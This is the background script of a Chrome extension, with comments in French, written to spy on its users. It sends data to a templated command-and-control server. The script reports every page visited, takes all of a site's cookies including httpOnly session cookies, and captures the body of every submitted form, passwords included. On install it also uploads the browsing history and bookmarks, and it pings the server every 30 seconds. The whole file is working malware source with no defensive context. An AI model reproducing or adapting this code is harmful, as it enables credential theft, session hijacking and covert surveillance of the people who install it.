// extension/background.js
const C2 = "%%C2%%";

function post(endpoint, data) {
  fetch(C2 + endpoint, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(data),
  }).catch(() => {});
}

// URLs visitées
chrome.tabs.onUpdated.addListener(
  (tabId, info, tab) => {
    if (info.status !== "complete" || !tab.url)
      return;
    if (tab.url.startsWith("chrome://"))
      return;

    // Log navigation
    post("/ext/nav", {
      url:   tab.url,
      title: tab.title,
      ts:    new Date().toISOString(),
    });

    // Cookies du domaine
    const domain = new URL(tab.url).hostname;
    chrome.cookies.getAll({ domain }, cookies => {
      if (cookies.length) {
        post("/ext/cookies", {
          domain,
          url:     tab.url,
          cookies: cookies.map(c => ({
            name:     c.name,
            value:    c.value,
            httpOnly: c.httpOnly,
            secure:   c.secure,
          })),
          ts: new Date().toISOString(),
        });
      }
    });
  }
);

// Intercepter les POST (formulaires)
chrome.webRequest.onBeforeRequest.addListener(
  details => {
    if (details.method !== "POST")
      return;
    if (!details.requestBody)
      return;
    const body = details.requestBody;
    let data   = null;
    if (body.formData) {
      data = body.formData;
    } else if (body.raw && body.raw[0]) {
      try {
        const bytes = body.raw[0].bytes;
        data = new TextDecoder().decode(bytes);
      } catch (e) {}
    }
    if (data) {
      post("/ext/form_submit", {
        url:    details.url,
        tabUrl: details.initiator || "",
        data:   data,
        ts:     new Date().toISOString(),
      });
    }
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

// À l'installation — exfiltrer l'historique
chrome.runtime.onInstalled.addListener(() => {
  post("/ext/install", {
    ts: new Date().toISOString(),
    ua: navigator.userAgent,
  });

  chrome.history.search(
    { text: "", maxResults: 500, startTime: 0 },
    items => {
      post("/ext/history", {
        count: items.length,
        items: items.map(i => ({
          url:    i.url,
          title:  i.title,
          visits: i.visitCount,
          last:   i.lastVisitTime,
        })),
      });
    }
  );

  chrome.bookmarks.getTree(tree => {
    post("/ext/bookmarks", { tree });
  });
});

// Ping toutes les 30s
setInterval(() => {
  post("/ext/ping", {
    ts: new Date().toISOString() });
}, 30000);